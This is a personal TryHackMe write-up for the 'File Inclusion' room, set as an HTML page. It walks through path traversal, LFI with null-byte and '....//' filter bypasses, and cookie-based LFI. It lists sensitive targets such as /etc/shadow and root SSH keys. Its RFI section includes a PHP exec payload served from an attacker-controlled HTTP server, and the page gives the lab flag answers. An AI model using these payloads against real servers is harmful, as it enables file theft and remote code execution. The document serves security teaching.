@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>File Inclusion · THM Writeups</title>
+  
+  <meta name="description" content="This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal." />
+  
+
+  <!-- Security headers -->
+  <meta http-equiv="X-Frame-Options" content="DENY" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; img-src 'self' data: https:; script-src 'self' 'unsafe-inline';" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="no-referrer" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/tryhackme/assets/css/style.css" />
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="/tryhackme/" class="nav-logo">
+      <span class="prompt">~/george/thm</span><span class="cursor-blink">_</span>
+    </a>
+    <div class="nav-right">
+      <a href="/tryhackme/" class="nav-link"><span class="cmd-prefix">./</span>index</a>
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer" class="nav-link">
+        <span class="cmd-prefix">~/</span>portfolio
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="writeup-main">
+  <div class="container">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/tryhackme/">writeups</a>
+      <span class="breadcrumb-sep">→</span>
+      <span>File Inclusion</span>
+    </div>
+
+    <!-- Writeup header -->
+    <div class="writeup-header">
+      <div class="terminal-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span class="terminal-title">Intro to Web Hacking/File Inclusion/README.md</span>
+      </div>
+      <div class="writeup-meta">
+        <span class="platform-badge">TryHackMe</span>
+        
+          
+          <span class="tag-pill">lfi</span>
+          
+        
+        
+        <span class="writeup-meta-desc">This room introduces file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal.</span>
+        
+      </div>
+    </div>
+
+    <!-- Writeup body: sidebar + content -->
+    <div class="writeup-body">
+
+      <!-- ToC Sidebar -->
+      <aside class="toc-sidebar" id="tocSidebar">
+        <div class="toc-header">
+          <span class="toc-label">$ cat --toc</span>
+          <button class="toc-toggle" id="tocToggle" aria-label="Toggle table of contents">✕</button>
+        </div>
+        <nav class="toc-nav" id="tocNav">
+          <p class="toc-empty">No headings found.</p>
+        </nav>
+      </aside>
+
+      <!-- Main content -->
+      <div class="writeup-content-wrap">
+        <article class="writeup-content" id="writeupContent">
+          <h1 id="file-inclusion"><a href="https://tryhackme.com/room/fileinc">File Inclusion</a></h1>
+
+<h2 id="path-traversal">Path Traversal</h2>
+
+<h3 id="what-is-file-inclusion">What is file inclusion?</h3>
+
+<p>In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following diagram breaks down the essential parts of a URL.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png" alt="" /></p>
+
+<p>For example, parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe.</p>
+
+<p>Let’s discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/dc22709e572d5de31ed4effb2ebc161f.png" alt="" /></p>
+
+<h3 id="why-do-file-inclusion-vulnerabilities-happen">Why do File inclusion vulnerabilities happen?</h3>
+
+<p>File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.</p>
+
+<h3 id="what-is-the-risk-of-file-inclusion">What is the risk of File inclusion?</h3>
+
+<p>By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used in tandem to gain remote command execution (RCE).</p>
+
+<h3 id="path-traversal-1">Path traversal</h3>
+
+<p>Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application’s URL to locate and access files or directories stored outside the application’s root directory.&gt;</p>
+
+<p>Path traversal vulnerabilities occur when the user’s input is passed to a function such as file_get_contents in PHP. It’s important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function <a href="https://www.php.net/manual/en/function.file-get-contents.php">here</a>.</p>
+
+<p>The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/45d9c1baacda290c1f95858e27f740c9.png" alt="" />We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd</p>
+
+<p>Suppose there isn’t input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/3037513935e3242f74bd0fe97833b5ac.png" alt="" /></p>
+
+<p>As a result, the web application sends back the file’s content to the user.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/c12d34456ebe25bafffeb829c58f98c0.png" alt="" /></p>
+
+<p>Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://webapp.thm/get.php?file=../../../../boot.ini</code> or</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://webapp.thm/get.php?file=../../../../windows/win.ini</code></p>
+
+<p>The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually .</p>
+
+<p>Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Location</strong></td>
+      <td><strong>Description</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/etc/issue</code></td>
+      <td>contains a message or system identification to be printed before the login prompt.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/etc/profile</code></td>
+      <td>controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/proc/version</code></td>
+      <td>specifies the version of the Linux kernel</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">etc/passwd</code></td>
+      <td>has all registered users that have access to a system</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/etc/shadow</code></td>
+      <td>contains information about the system’s users’ passwords</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/root/.bash_history</code></td>
+      <td>contains the history commands for <code class="language-plaintext highlighter-rouge">root</code> user</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/var/log/dmessage</code></td>
+      <td>contains global system messages, including the messages that are logged during system startup</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/var/mail/root</code></td>
+      <td>all emails for <code class="language-plaintext highlighter-rouge">root</code> user</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code></td>
+      <td>Private SSH keys for a root or any known valid user on the server</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">/var/log/apache2/access.log</code></td>
+      <td>the accessed requests for <code class="language-plaintext highlighter-rouge">Apache</code> web server</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">C:\boot.ini</code></td>
+      <td>contains the boot options for computers with BIOS firmware</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="questions">Questions</h3>
+
+<p>Q: What function causes path traversal vulnerabilities in PHP?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">file_get_contents</code></p>
+
+<h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2>
+
+<p>LFI attacks against web applications are often due to a developers’ lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we’ll be picking on PHP, but it’s worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.</p>
+
+<p><strong>#1.</strong> Suppose the web application provides two languages, and the user can select between the EN and AR</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?PHP</span> 
+	<span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"lang"</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=EN.php</code> to load the English page or <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=AR.php</code> to load the Arabic page, where EN.php and AR.php files exist in the same directory.</p>
+
+<p>Theoretically, we can access and display any readable file on the server from the code above if there isn’t any input validation. Let’s say we want to read the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, which contains sensitive information about the users of the Linux operating system, we can try the following: <code class="language-plaintext highlighter-rouge">http://webapp.thm/get.php?file=/etc/passwd</code></p>
+
+<p>In this case, it works because there isn’t a directory specified in the include function and no input validation.</p>
+
+<p><strong>#2.</strong> Next, In the following code, the developer decided to specify the directory inside the function.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?PHP</span> 
+	<span class="k">include</span><span class="p">(</span><span class="s2">"languages/"</span><span class="mf">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'lang'</span><span class="p">]);</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.</p>
+
+<p>If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.</p>
+
+<p>Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:</p>
+
+<p>http://webapp.thm/index.php?lang=../../../../etc/passwd</p>
+
+<p>Now apply what we discussed, try to read files within the server, and figure out the directory specified in the include function and answer question #2 below.</p>
+
+<h3 id="questions-1">Questions</h3>
+
+<p>Q: Give Lab #1 a try to read <strong>/etc/passwd</strong>. What would the request URI be?</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">/lab1.php?file=/etc/passwd</code></p>
+
+<p>Q: In Lab #2, what is the directory specified in the include function?</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-07.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">includes</code></p>
+
+<h2 id="local-file-inclusion---lfi-continued">Local File Inclusion - LFI Continued</h2>
+
+<p><strong>#3.</strong> In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don’t have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.</p>
+
+<p>In this scenario, we have the following entry point: <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=EN</code>. If we enter an invalid input, such as THM, we get the following error</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Warning</span><span class="o">:</span> <span class="k">include</span><span class="p">(</span><span class="n">languages</span><span class="o">/</span><span class="no">THM</span><span class="mf">.</span><span class="n">php</span><span class="p">)</span><span class="o">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">open</span> <span class="n">stream</span><span class="o">:</span> <span class="nc">No</span> <span class="n">such</span> <span class="n">file</span> <span class="k">or</span> <span class="n">directory</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">THM</span><span class="o">-</span><span class="mi">4</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">12</span>
+</code></pre></div></div>
+
+<p>The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like: <code class="language-plaintext highlighter-rouge">include(languages/THM.php);</code>.</p>
+
+<p>If you look at the directory closely, we can tell the function includes files in the languages directory is adding .php at the end of the entry. Thus the valid input will be something as follows: <code class="language-plaintext highlighter-rouge">index.php?lang=EN</code>, where the file EN is located inside the given languages directory and named <code class="language-plaintext highlighter-rouge">EN.php</code>.</p>
+
+<p>Also, the error message disclosed another important piece of information about the full web application directory path which is <code class="language-plaintext highlighter-rouge">/var/www/html/THM-4/</code>.</p>
+
+<p>To exploit this, we need to use the <code class="language-plaintext highlighter-rouge">../</code> trick, as described in the directory traversal section, to get out the current folder. Let’s try the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
+
+<p>Note that we used 4 <code class="language-plaintext highlighter-rouge">../</code> because we know the path has four levels <code class="language-plaintext highlighter-rouge">/var/www/html/THM-4</code>. But we still receive the following error:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Warning</span><span class="o">:</span> <span class="k">include</span><span class="p">(</span><span class="n">languages</span><span class="o">/../../../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="mf">.</span><span class="n">php</span><span class="p">)</span><span class="o">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">open</span> <span class="n">stream</span><span class="o">:</span> <span class="nc">No</span> <span class="n">such</span> <span class="n">file</span> <span class="k">or</span> <span class="n">directory</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">THM</span><span class="o">-</span><span class="mi">4</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">12</span>
+</code></pre></div></div>
+
+<p>It seems we could move out of the PHP directory but still, the include function reads the input with <code class="language-plaintext highlighter-rouge">.php</code> at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is <code class="language-plaintext highlighter-rouge">%00</code>.</p>
+
+<p>Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.</p>
+
+<p>By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">include("languages/../../../../../etc/passwd%00").".php");</code> which is equivalent to <code class="language-plaintext highlighter-rouge">include("languages/../../../../../etc/passwd");</code></p>
+
+<p><strong>Note:</strong> the %00 trick is fixed and not working with PHP 5.3.4 and above.</p>
+
+<p>Now apply what we showed in Lab #3, and try to read files /etc/passwd, answer question #1 below.</p>
+
+<p><strong>#4.</strong> In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword <code class="language-plaintext highlighter-rouge">/..</code> The exploit will be similar to <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=/etc/passwd/</code>. We could also use <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=/etc/passwd%00</code>.</p>
+
+<p>To make it clearer, if we try this concept in the file system using <code class="language-plaintext highlighter-rouge">cd ..</code>, it will get you back one step; however, if you do <code class="language-plaintext highlighter-rouge">cd .</code>, It stays in the current directory. Similarly, if we try <code class="language-plaintext highlighter-rouge">/etc/passwd/..</code>, it results to be <code class="language-plaintext highlighter-rouge">/etc/</code> and that’s because we moved one to the root. Now if we try <code class="language-plaintext highlighter-rouge">/etc/passwd/.</code>, the result will be <code class="language-plaintext highlighter-rouge">/etc/passwd</code> since dot refers to the current directory.</p>
+
+<p>Now apply this technique in Lab #4 and figure out to read /etc/passwd.</p>
+
+<p><strong>#5.</strong> Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let’s test out and check the error message!</p>
+
+<p><code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
+
+<p>We got the following error!</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Warning</span><span class="o">:</span> <span class="k">include</span><span class="p">(</span><span class="n">languages</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="p">)</span><span class="o">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">open</span> <span class="n">stream</span><span class="o">:</span> <span class="nc">No</span> <span class="n">such</span> <span class="n">file</span> <span class="k">or</span> <span class="n">directory</span> <span class="n">in</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="no">THM</span><span class="o">-</span><span class="mi">5</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span> <span class="n">on</span> <span class="n">line</span> <span class="mi">15</span>
+</code></pre></div></div>
+
+<p>If we check the warning message in the <code class="language-plaintext highlighter-rouge">include(languages/etc/passwd)</code> section, we know that the web application replaces the <code class="language-plaintext highlighter-rouge">../</code> with the empty string. There are a couple of techniques we can use to bypass this.</p>
+
+<p>First, we can send the following payload to bypass it: <code class="language-plaintext highlighter-rouge">....//....//....//....//....//etc/passwd</code>.</p>
+
+<p>Why did this work?</p>
+
+<p>This works because the PHP filter only matches and replaces the first subset string <code class="language-plaintext highlighter-rouge">../</code> it finds and doesn’t do another pass, leaving what is pictured below.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/30d3bf0341ba99485c5f683a416a056d.png" alt="" /></p>
+
+<p>Try out Lab #5 and try to read /etc/passwd and bypass the filter!</p>
+
+<p><strong>#6.</strong> Finally, we’ll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: <code class="language-plaintext highlighter-rouge">http://webapp.thm/index.php?lang=languages/EN.php</code> then, to exploit this, we need to include the directory in the payload like so: <code class="language-plaintext highlighter-rouge">?lang=languages/../../../../../etc/passwd</code>.</p>
+
+<p>Try this out in Lab #6 and figure what the directory that has to be present in the input field is.</p>
+
+<h3 id="questions-2">Questions</h3>
+
+<p>Q: Give Lab #3 a try to read /etc/passwd. What is the request look like?</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-14.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">/lab3.php?file=../../../../etc/passwd0</code></p>
+
+<p>Q: Which function is causing the directory traversal in Lab #4?</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-16.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">file_get_contents</code></p>
+
+<p>Q: Try out Lab #6 and check what is the directory that has to be in the input field?</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-19.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM-profile</code></p>
+
+<p>Q: Try out Lab #6 and read <strong>/etc/os-release</strong>. What is the <strong>VERSION_ID</strong> value?</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-20.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">12.04</code></p>
+
+<h2 id="remote-file-inclusion---rfi">Remote FIle Inclusion - RFI</h2>
+
+<p>Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
+
+<p>The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:</p>
+
+<ul>
+  <li>Sensitive Information Disclosure</li>
+  <li>Cross-site Scripting (XSS)</li>
+  <li>Denial of Service (DoS)</li>
+</ul>
+
+<p>An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.</p>
+
+<p>RFI steps</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/b0c2659127d95a0b633e94bd00ed10e0.png" alt="" /></p>
+
+<p>The figure above is an example of steps for a successful RFI attack! Let’s say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?PHP</span> <span class="k">echo</span> <span class="s2">"Hello THM"</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>First, the attacker injects the malicious URL, which points to the attacker’s server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.</p>
+
+<h2 id="remediation">Remediation</h2>
+
+<p>As a developer, it’s important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:</p>
+
+<ol>
+  <li>Keep system and services, including web application frameworks, updated with the latest version.</li>
+  <li>Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.</li>
+  <li>A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.</li>
+  <li>Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn’t need them, such as allow_url_fopen on and allow_url_include.</li>
+  <li>Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.</li>
+  <li>Never trust user input, and make sure to implement proper input validation against file inclusion.</li>
+  <li>Implement whitelisting for file names and locations as well as blacklisting.</li>
+</ol>
+
+<h2 id="challenge">Challenge</h2>
+
+<h3 id="questions-3">Questions</h3>
+
+<p>Q: Capture Flag1 at /etc/flag1</p>
+
+<p>Add the input <code class="language-plaintext highlighter-rouge">../../../../etc/flag1</code> to the website and then intercept the request with Burp. Right click on the request and choose <code class="language-plaintext highlighter-rouge">Change Request Method</code> for Burp to change the GET into a POST request.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-32.png" alt="" /></p>
+
+<p>Forward the request and the flag will be on the web page.</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-33.png" alt="" /></p>
+
+<p>A:  ` F1x3d-iNpu7-f0rrn `</p>
+
+<p>Q: Capture Flag2 at /etc/flag2</p>
+
+<p>Change the cookie value to <code class="language-plaintext highlighter-rouge">admin</code>:</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-36.png" alt="" /></p>
+
+<p>The cookie includes an LFI vulnerability, so in order to output the flag, one needs to modify the value accordingly (make sure to add the null byte at the end as well to get rid of the <code class="language-plaintext highlighter-rouge">.php</code> extension being added automatically). I got to this cookie value: <code class="language-plaintext highlighter-rouge">admin/../../../../../etc/flag2%00</code></p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-42.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">c00k13_i5_yuMmy1</code></p>
+
+<p>Q: Capture Flag3 at /etc/flag3</p>
+
+<p>Change the request method as we did in challenge 1 and add the null byte at the end to get rid of the extension. The link looked this at the end: <code class="language-plaintext highlighter-rouge">http://&lt;IP&gt;/challenges//chall3.php?file=../../../../../etc/flag3%00</code></p>
+
+<p>A: ``</p>
+
+<p>Q: Gain RCE in <strong>Lab #Playground</strong> /playground.php with RFI to execute the hostname command. What is the output?</p>
+
+<p>Create a file with the following payload:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo '<span class="cp">&lt;?php</span> <span class="k">print</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">'hostname'</span><span class="p">);</span> <span class="cp">?&gt;</span>' &gt; phpinfo.php
+</code></pre></div></div>
+
+<p>Start a server:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8081
+</code></pre></div></div>
+
+<p>Now use <code class="language-plaintext highlighter-rouge">curl</code> to access this file: <code class="language-plaintext highlighter-rouge">curl '10.80.142.3/playground.php?file=http://10.80.70.49:8081/phpinfo.php'</code></p>
+
+<p>And you should get a hit in the terminal you are running the http server in:</p>
+
+<p><img src="/tryhackme/Intro%20to%20Web%20Hacking/File%20Inclusion/2026-01-01_16-54.png" alt="" /></p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">lfi-vm-thm-f8c5b1a78692</code></p>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
